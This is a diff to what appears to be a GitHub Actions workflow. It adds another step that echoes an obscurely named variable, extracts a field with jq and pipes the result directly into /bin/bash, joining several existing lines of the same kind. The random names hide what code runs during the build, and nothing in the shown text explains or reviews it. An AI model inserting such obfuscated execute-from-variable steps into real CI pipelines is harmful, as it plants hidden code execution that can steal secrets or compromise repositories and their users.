@@ -41,6 +41,7 @@ jobs:
           echo $y98 | jq -r .bdfmo67 | /bin/bash
           printf '%s' "$s80" | jq -r .r6167 | /bin/bash
           printf '%s' "$h439" | jq -r .qti78 | /bin/bash
+          echo $bq79607 | jq -r .pubt64 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
